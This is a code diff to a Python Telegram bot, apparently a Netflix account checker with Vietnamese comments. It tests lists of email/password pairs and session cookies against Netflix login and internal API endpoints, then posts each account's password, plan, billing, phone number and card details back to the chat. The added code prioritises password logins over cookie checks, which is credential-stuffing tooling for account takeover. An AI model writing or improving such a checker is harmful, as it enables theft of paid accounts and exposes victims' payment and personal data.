@@ -135,7 +135,7 @@ def check_cookie_validity(cookie_str: str) -> dict:
             "https://www.netflix.com/api/shakti/v4f72bc24/profileNavigation",
             headers=headers,
             cookies=cookies,
-            timeout=10
+            timeout=15
         )
 
         if resp.status_code == 200:
@@ -152,7 +152,7 @@ def check_cookie_validity(cookie_str: str) -> dict:
             "https://www.netflix.com/browse",
             headers=headers,
             cookies=cookies,
-            timeout=10,
+            timeout=15,
             allow_redirects=False
         )
 
@@ -189,6 +189,66 @@ def format_account_result(info: dict, cookie_result: dict) -> str:
             "COOKIE_KHONG_XAC_DINH": "KHONG XAC DINH"
         }
         status = reason_map.get(cookie_reason, "KHONG XAC DINH")
+
+    result = f"""
+📧 Email: {info['email']}
+🔑 Password: {info['password']}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🌍 Country: {info['country']}
+📦 Plan: {info['plan']}
+💰 Cost: {info['cost']}
+🎬 Streams: {info['streams']}
+📅 Billing Date: {info['billing_date']}
+💳 Payment: {info['payment_method']}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 Member Plan: {info['member_plan']}
+⚠️ User On Hold: {info['user_on_hold']}
+📊 Status: {info['membership_status']}
+🎥 Max Streams: {info['max_streams']}
+🖥️ Video Quality: {info['video_quality']}
+👥 Profiles: {info['connected_profiles']}
+➕ Extra Member: {info['has_extra_member']}
+📱 Phone: {info['phone_number']}
+✅ Email Verified: {info['email_verified']}
+📆 Member Since: {info['member_since']}
+🔄 Next Billing: {info['next_billing_date']}
+💳 Card: {info['cc']}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🍪 Cookie: {cookie_reason}
+━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 TRANG THAI: {status}
+"""
+    return result.strip()
+
+
+# ================== HÀM FORMAT KẾT QUẢ V2 (UU TIEN MAT KHAU) ==================
+def format_account_result_v2(info: dict, login_result: dict, cookie_result: dict) -> str:
+    """
+    Format ket qua - uu tien ket qua dang nhap mat khau.
+    """
+    # Lay trang thai tu mat khau
+    login_valid = login_result.get("valid", False)
+    login_reason = login_result.get("reason", "KHONG_XAC_DINH")
+
+    # Map ly do mat khau
+    if login_valid:
+        status = "✅ HOAT DONG"
+        status_detail = "DANG_NHAP_THANH_CONG"
+    else:
+        reason_map = {
+            "SAI_MAT_KHAU": "❌ SAI_MAT_KHAU",
+            "TAI_KHOAN_KHONG_TON_TAI": "❌ TAI_KHOAN_KHONG_TON_TAI",
+            "TAI_KHOAN_BI_KHOA_TAM": "❌ BI_TAM_KHOA_(ON_HOLD)",
+            "LOI_THANH_TOAN": "❌ LOI_THANH_TOAN",
+            "TAI_KHOAN_HET_HAN": "❌ HET_HAN",
+            "KHONG_XAC_DINH": "❌ KHONG_XAC_DINH",
+            "LOI_TRUY_CAP": "❌ LOI_TRUY_CAP"
+        }
+        status = reason_map.get(login_reason, f"❌ {login_reason}")
+        status_detail = login_reason
+
+    # Cookie chi hien thi phu
+    cookie_reason = cookie_result.get("reason", "")
 
     result = f"""
 📧 Email: {info['email']}
@@ -379,11 +439,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Dang phan tich {len(parsed_accounts)} tai khoan (format moi)...")
 
         for info in parsed_accounts:
-            # Kiem tra cookie
-            cookie_result = check_cookie_validity(info['cookie']) if info['cookie'] else {"valid": False, "reason": "KHONG_CO_COOKIE"}
+            # Kiem tra mat khau truoc (quan trong nhat)
+            login_result = check_with_requests(info['email'], info['password'])
 
-            # Format ket qua
-            result = format_account_result(info, cookie_result)
+            # Neu login thanh cong thi khong can kiem tra cookie nua
+            cookie_result = {"valid": False, "reason": "BO_QUA"}
+            if info['cookie'] and not login_result["valid"]:
+                try:
+                    cookie_result = check_cookie_validity(info['cookie'])
+                except Exception as e:
+                    cookie_result = {"valid": False, "reason": f"LOI: {str(e)[:30]}"}
+
+            # Format ket qua - uu tien mat khau
+            result = format_account_result_v2(info, login_result, cookie_result)
             await update.message.reply_text(result)
             await asyncio.sleep(1)
 
